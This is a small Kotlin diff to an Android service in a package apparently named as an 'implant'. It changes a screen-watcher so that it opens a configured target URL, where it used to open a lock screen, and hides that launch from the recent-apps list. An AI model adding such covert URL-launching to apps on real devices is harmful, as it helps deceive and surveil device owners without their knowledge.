@@ -2,6 +2,7 @@ package com.cooperthecoder.implant
 
 import android.app.IntentService
 import android.content.Intent
+import android.net.Uri
 import android.util.Log
 import java.text.DateFormat
 import java.util.*
@@ -23,8 +24,8 @@ class ScreenWatcherService : IntentService(TAG) {
     }
 
     private fun showUnlockScreen() {
-        val intent = Intent(this, LockScreenActivity::class.java)
-        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(Config.TARGET_URL_FOR_OPEN))
+        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
         startActivity(intent)
     }
 
